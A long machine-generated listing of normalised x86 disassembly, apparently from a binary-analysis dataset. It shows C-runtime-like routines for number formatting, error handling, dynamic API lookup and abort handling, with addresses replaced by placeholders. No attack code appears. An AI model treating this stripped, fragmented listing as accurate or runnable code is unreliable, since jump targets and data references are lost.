add eax 0xb
mov [ esi ] 0x0
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x4 ]
mov ecx eax
shr ecx 0x14
mov edx 0x7ff
push ebx
and ecx edx
xor ebx ebx
cmp ecx edx
jne r-xdata
call sub_410cee
push 0x22
jmp r-xdata
pop edi
pop esi
leave
retn
and eax 0x80000000
xor ecx ecx
or ecx eax
je r-xdata
test ebx ebx
jne r-xdata
pop esi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] esi
call sub_40edf4
add esp 0x14
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov ebx [ ebp + 0x18 ]
mov [ esi ] 0x30
inc esi
test ebx ebx
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi ] al
mov ecx [ edi + 0x4 ]
inc esi
neg ebx
sbb ebx ebx
and ebx 0xffffffe0
and ecx 0x7ff00000
xor eax eax
add ebx 0x27
xor edx edx
or eax ecx
jne r-xdata
mov [ esi ] 0x2d
inc esi
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov [ esi ] 0x31
inc esi
mov [ esi ] 0x30
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
inc esi
or eax ecx
jne r-xdata
add eax 0xfffffffe
or eax eax
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax ] dl
jmp r-xdata
mov [ ebp - 0x14 ] 0x3fe
jmp r-xdata
mov [ ebp - 0x14 ] edx
jmp r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] 0x0
je r-xdata
push 0x0
push [ ebp + 0x14 ]
lea ebx [ esi + 0x2 ]
push eax
push ebx
push edi
call sub_41d225
add esp 0x14
test eax eax
je r-xdata
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0xf0000
cmp eax edx
jbe r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
mov [ ebp - 0x8 ] ecx
ja r-xdata
mov eax esi
inc esi
mov [ ebp + 0xc ] eax
cmp [ ebp + 0x14 ] edx
jne r-xdata
mov [ esi ] 0x30
inc esi
cmp [ ebp + 0x18 ] 0x0
push 0x65
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi ] al
inc esi
push esi
call sub_41e7c0
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi ] 0x2d
inc esi
pop ebx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_41ec30
add ax 0x30
movzx eax ax
cmp ax 0x39
jbe r-xdata
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
jmp r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_41ec30
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp - 0x8 ]
sub [ ebp - 0x4 ] 0x4
mov [ esi ] al
mov eax [ ebp - 0xc ]
shrd eax ecx 0x4
shr ecx 0x4
inc esi
dec [ ebp + 0x14 ]
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
jge r-xdata
add eax ebx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push 0x30
push esi
call sub_414890
add esp 0xc
add esi [ ebp + 0x14 ]
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ esi - 0x1 ]
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp + 0x18 ] 0x0
mov cl 0x34
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edi ]
mov edx [ edi + 0x4 ]
inc esi
call sub_41ec30
xor ebx ebx
and eax 0x7ff
and edx ebx
sub eax [ ebp - 0x14 ]
push ebx
pop ecx
sbb edx ecx
js r-xdata
mov esi eax
mov [ eax ] 0x30
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi ] 0x2d
inc esi
neg eax
adc edx ebx
neg edx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
test edx edx
jl r-xdata
mov ecx 0x3e8
jg r-xdata
mov [ esi ] 0x2b
inc esi
jmp r-xdata
cmp eax ebx
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
cmp esi edi
jne r-xdata
jg r-xdata
push ebx
push ecx
push edx
push eax
call sub_41eb50
add al 0x30
mov [ esi ] al
inc esi
mov [ ebp - 0x10 ] edx
mov eax ecx
mov edx ebx
cmp esi edi
jne r-xdata
cmp eax ecx
jb r-xdata
cmp edx ebx
mov edi esi
mov [ esi ] 0x30
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
push 0x0
push 0xa
push edx
push eax
call sub_41eb50
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov [ ebp - 0x10 ] ebx
test edx edx
jl r-xdata
push 0x0
push 0x64
push edx
push eax
call sub_41eb50
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov edx ebx
cmp eax 0x64
jb r-xdata
add al 0x30
mov [ esi ] al
mov [ esi + 0x1 ] 0x0
jg r-xdata
cmp eax 0xa
jb r-xdata
sub_41d5b8
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x14 ]
mov ebx eax
mov esi [ ebx + 0x4 ]
mov edi ecx
lea ecx [ ebp - 0x10 ]
dec esi
call sub_40e5f8
test edi edi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
call sub_410cee
push 0x16
pop esi
mov [ eax ] esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40edf4
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebx ] 0x2d
mov esi edi
jne r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebx + 0x4 ]
xor edi edi
inc edi
test eax eax
jg r-xdata
mov [ edi ] 0x2d
lea esi [ edi + 0x1 ]
xor eax eax
cmp [ ebx ] 0x2d
sete al
add eax esi
add eax edi
mov [ eax ] 0x30
mov [ eax + 0x1 ] 0x0
add esi eax
mov eax esi
call sub_41cfa1
mov [ esi ] 0x30
inc esi
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
call sub_41cfa1
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
mov ebx [ ebx + 0x4 ]
inc esi
test ebx ebx
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
neg ebx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] ebx
cmp [ ebp + 0xc ] ebx
jl r-xdata
mov edi [ ebp + 0xc ]
mov eax esi
call sub_41cfa1
push edi
push 0x30
push esi
call sub_414890
add esp 0xc
sub_41d6af
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_41eab9
xor ebx ebx
add esp 0x14
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jbe r-xdata
call sub_410cee
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_40edf4
add esp 0x14
mov eax esi
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40e1e0
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
or eax eax
jmp r-xdata
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2c ]
push ebx
push esi
push [ ebp + 0x10 ]
mov ecx edi
call sub_41d5b8
add esp 0x10
mov [ edi ] bl
jmp r-xdata
mov esi [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x28 ]
add ecx esi
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
add eax edi
push eax
call sub_41e93d
add esp 0x10
cmp eax ebx
je r-xdata
sub_41d76a
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x16
pop edi
push edi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x30 ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_41eab9
xor ebx ebx
add esp 0x14
cmp esi ebx
jne r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx ebx
jbe r-xdata
call sub_410cee
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] edi
call sub_40edf4
add esp 0x14
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x2c ]
dec eax
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x30 ] 0x2d
sete al
lea edi [ eax + esi ]
cmp ecx 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40e1e0
leave
retn
sub ecx eax
or ecx ecx
jmp r-xdata
mov eax [ ebp - 0x2c ]
dec eax
cmp [ ebp - 0x20 ] eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ esi ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push [ ebp + 0x14 ]
push ecx
push edi
call sub_41e93d
add esp 0x10
cmp eax ebx
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push eax
push [ ebp + 0x18 ]
mov eax esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_41cfe6
add esp 0x18
cmp eax [ ebp + 0x14 ]
jge r-xdata
cmp cl bl
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
call sub_41d5b8
add esp 0x10
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
mov [ edi - 0x2 ] bl
sub_41d864
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
cmp eax 0x65
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41d155
cmp eax 0x45
je r-xdata
cmp eax 0x66
jne r-xdata
cmp eax 0x61
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41d6af
add esp 0x14
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41d245
jmp r-xdata
cmp eax 0x41
je r-xdata
add esp 0x18
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41d76a
jmp r-xdata
sub_41d8ec
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41d864
add esp 0x1c
pop ebp
retn
sub_41d90f
mov edi edi
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call sub_41ec4f
add esp 0xc
test eax eax
je r-xdata
pop esi
retn
push esi
push esi
push esi
push esi
push esi
call sub_40eccc
add esp 0x14
sub_41d93a
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
fld [ r--data ]
fstp [ ebp - 0x10 ]
fld [ r--data ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x18 ]
fdiv [ ebp - 0x10 ]
fmul [ ebp - 0x10 ]
fsubr [ ebp - 0x18 ]
fstp [ ebp - 0x8 ]
fld1
fcomp [ ebp - 0x8 ]
fnstsw ax
test ah 0x5
jpe r-xdata
xor eax eax
leave
retn
xor eax eax
inc eax
leave
retn
sub_41d978
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
jmp sub_41d93a
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push 0x0
call eax
retn
sub_41d9a1
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push ebx
push esi
xor esi esi
push edi
mov [ ebp - 0x18 ] 0x404e
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
cmp [ ebp + 0xc ] esi
jbe r-xdata
cmp [ eax + 0x8 ] esi
je r-xdata
mov edx [ eax ]
mov ebx [ eax + 0x4 ]
mov esi eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx edx
shr ecx 0x1f
lea edi [ edx + edx ]
lea edx [ ebx + ebx ]
or edx ecx
mov ecx [ eax + 0x8 ]
mov esi ebx
shr esi 0x1f
add ecx ecx
or ecx esi
mov [ ebp - 0x14 ] edi
mov esi edi
and [ ebp - 0x14 ] 0x0
mov ebx edx
shr ebx 0x1f
add ecx ecx
shr edi 0x1f
or ecx ebx
mov ebx [ ebp - 0x10 ]
add esi esi
add edx edx
or edx edi
lea edi [ esi + ebx ]
mov [ eax ] esi
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
cmp edi esi
jb r-xdata
mov ecx [ eax + 0x4 ]
mov edx ecx
shr edx 0x10
mov [ eax + 0x8 ] edx
mov edx [ eax ]
mov edi edx
shl ecx 0x10
shr edi 0x10
or ecx edi
shl edx 0x10
add [ ebp - 0x18 ] 0xfff0
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
mov ebx 0x8000
test [ eax + 0x8 ] ebx
jne r-xdata
mov [ ebp - 0x14 ] 0x1
cmp edi ebx
jae r-xdata
mov cx [ ebp - 0x18 ]
mov [ eax + 0xa ] cx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40e1e0
leave
retn
mov esi [ eax ]
mov edi [ eax + 0x4 ]
add [ ebp - 0x18 ] 0xffff
mov ecx esi
add esi esi
shr ecx 0x1f
mov [ eax ] esi
lea esi [ edi + edi ]
or esi ecx
mov ecx [ eax + 0x8 ]
mov edx edi
shr edx 0x1f
add ecx ecx
or ecx edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] ecx
test ebx ecx
je r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
lea ebx [ ecx + edx ]
xor esi esi
cmp ebx ecx
jb r-xdata
lea esi [ edx + 0x1 ]
cmp esi edx
jb r-xdata
xor ebx ebx
mov [ eax ] edi
cmp [ ebp - 0x14 ] ebx
je r-xdata
xor esi esi
inc esi
cmp ebx edx
jae r-xdata
xor ebx ebx
inc ebx
cmp esi 0x1
jae r-xdata
mov ecx [ ebp - 0x8 ]
add [ eax + 0x8 ] ecx
and [ ebp - 0x14 ] 0x0
lea ecx [ edi + edi ]
mov edx edi
shr edx 0x1f
lea edi [ ebx + ebx ]
or edi edx
mov edx [ eax + 0x8 ]
mov esi ebx
shr esi 0x1f
lea ebx [ edx + edx ]
mov edx [ ebp + 0x8 ]
or ebx esi
mov [ eax ] ecx
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] ebx
movsx edx [ edx ]
lea esi [ ecx + edx ]
mov [ ebp - 0x10 ] edx
cmp esi ecx
jb r-xdata
inc [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
test esi esi
je r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x4 ] esi
test ebx ebx
je r-xdata
mov [ ebp - 0x14 ] 0x1
cmp esi edx
jae r-xdata
dec [ ebp + 0xc ]
inc [ ebp + 0x8 ]
cmp [ ebp + 0xc ] 0x0
ja r-xdata
lea ecx [ edi + 0x1 ]
xor edx edx
cmp ecx edi
jb r-xdata
cmp [ ebp - 0x14 ] 0x0
mov [ eax ] esi
je r-xdata
xor esi esi
jmp r-xdata
xor edx edx
inc edx
cmp ecx 0x1
jae r-xdata
inc ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x4 ] ecx
test edx edx
je r-xdata
sub_41db6f
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
jne r-xdata
call sub_410cee
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_40edf4
add esp 0x14
mov eax esi
jmp r-xdata
cmp [ ebp + 0xc ] ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ ebp + 0x10 ]
cmp edi ebx
jne r-xdata
mov [ esi ] bl
jmp r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x14 ]
call sub_40e5f8
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
mov [ esi ] bl
call sub_410cee
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_40edf4
add esp 0x14
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov edx [ ebp + 0xc ]
mov eax esi
jne r-xdata
push [ ebp + 0x14 ]
push edi
push [ ebp + 0xc ]
push esi
call sub_41a235
add esp 0x10
jmp r-xdata
mov eax esi
jmp r-xdata
mov cl [ edi ]
mov [ eax ] cl
inc eax
inc edi
cmp cl bl
je r-xdata
mov cl [ edi ]
mov [ eax ] cl
inc eax
inc edi
cmp cl bl
je r-xdata
cmp [ ebp - 0x8 ] bl
je r-xdata
pop edi
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edx
je r-xdata
cmp edx ebx
jne r-xdata
dec edx
jne r-xdata
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
mov [ eax ] bl
inc eax
dec [ ebp + 0x14 ]
jne r-xdata
mov ecx eax
sub ecx esi
cmp ecx 0x2
jl r-xdata
cmp [ edi ] bl
je r-xdata
jmp r-xdata
cmp [ ebp - 0x8 ] bl
je r-xdata
lea edi [ eax - 0x2 ]
mov [ ebp + 0x14 ] edi
cmp edi esi
jb r-xdata
lea edi [ eax - 0x1 ]
mov [ ebp - 0x4 ] edi
cmp edi esi
jb r-xdata
cmp [ ebp + 0x14 ] 0x1
jne r-xdata
xor eax eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
mov eax edi
sub eax [ ebp + 0x14 ]
test al 0x1
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x14 ]
movzx eax [ eax ]
push eax
call sub_4172db
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
test al 0x1
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
push eax
call sub_4172db
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
mov [ edi ] bl
call sub_410cee
mov ecx eax
push 0x2a
pop eax
mov [ ecx ] eax
dec [ ebp + 0x14 ]
cmp [ ebp + 0x14 ] esi
jae r-xdata
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jae r-xdata
mov [ esi ] bl
call sub_410cee
push 0x22
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_40edf4
add esp 0x14
cmp [ ebp - 0x8 ] bl
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x1
jbe r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
mov [ esi + eax - 0x1 ] bl
lea edi [ esi + eax - 0x2 ]
mov [ ebp + 0x14 ] edi
cmp edi esi
jb r-xdata
push 0x50
pop eax
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx edi
sub ecx [ ebp + 0x14 ]
test cl 0x1
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x14 ]
movzx eax [ eax ]
push eax
call sub_4172db
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ edi ] bl
jmp r-xdata
mov eax [ ebp + 0xc ]
dec [ ebp + 0x14 ]
cmp [ ebp + 0x14 ] esi
jae r-xdata
cmp [ ebp - 0x8 ] bl
je r-xdata
sub_41dd7e
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
call sub_41348c
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx eax
jne r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
test edi edi
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
xor eax eax
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
je r-xdata
push [ rw-data ]
call sub_413495
pop ecx
test eax eax
je r-xdata
push eax
call sub_413495
pop ecx
test eax eax
je r-xdata
push eax
call sub_413495
push [ rw-data ]
mov esi eax
call sub_413495
pop ecx
pop ecx
mov edi eax
test esi esi
je r-xdata
push eax
call sub_41341a
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_41341a
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_41341a
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_41341a
pop ecx
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
test edi edi
je r-xdata
push r--data
push edi
call esi
push eax
call sub_41341a
pop ecx
mov [ rw-data ] eax
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
call esi
test eax eax
je r-xdata
push eax
call sub_413495
pop ecx
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push 0xc
lea ecx [ ebp - 0x14 ]
push ecx
push 0x1
push eax
call edi
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call eax
mov [ ebp - 0x4 ] eax
test [ ebp - 0xc ] 0x1
jne r-xdata
sub_41dee7
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
xor esi esi
cmp ecx esi
jl r-xdata
call sub_410cee
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
or eax 0xffffffff
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
cmp ecx 0x3
jne r-xdata
pop esi
pop ebp
retn
mov eax [ rw-data ]
jmp r-xdata
sub_41df44
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
test [ rw-data ] 0x1
push esi
je r-xdata
call sub_41afbe
test eax eax
je r-xdata
push 0xa
call sub_41881d
pop ecx
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_41afcb
pop ecx
push 0x3
call sub_41435d
int3
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov esi [ ebp + 0x4 ]
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] esi
mov eax [ eax - 0x4 ]
push 0x50
mov [ ebp - 0x21c ] eax
lea eax [ ebp - 0x328 ]
push 0x0
push eax
call sub_414890
lea eax [ ebp - 0x328 ]
add esp 0xc
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
push 0x0
mov [ ebp - 0x328 ] 0x40000015
mov [ ebp - 0x31c ] esi
mov [ ebp - 0x2d4 ] eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
sub_41e064
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
sub esp 0x14
cmp [ ebp + 0x8 ] ax
jne r-xdata
mov eax 0x100
cmp [ ebp + 0x8 ] ax
jae r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x14 ]
call sub_40e5f8
mov eax [ ebp - 0x14 ]
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_41ecbb
add esp 0x1c
test eax eax
jne r-xdata
movzx eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov ax [ ecx + eax * 2 ]
and ax [ ebp + 0xc ]
movzx eax ax
mov [ ebp - 0x4 ] eax
jmp r-xdata
movzx eax [ ebp - 0x4 ]
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
cmp [ ebp - 0x8 ] 0x0
je r-xdata
and [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
sub_41e0ee
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_40e5f8
mov ecx [ ebp + 0x10 ]
xor ebx ebx
cmp ecx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_410cee
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp ecx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
call sub_410cee
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
jmp r-xdata
push [ eax + 0x4 ]
push ecx
push [ ebp + 0xc ]
push ecx
push [ ebp + 0x8 ]
push 0x1001
push [ eax + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call sub_41f087
add esp 0x20
cmp eax ebx
jne r-xdata
push [ ebp + 0x14 ]
push ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41f0c9
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
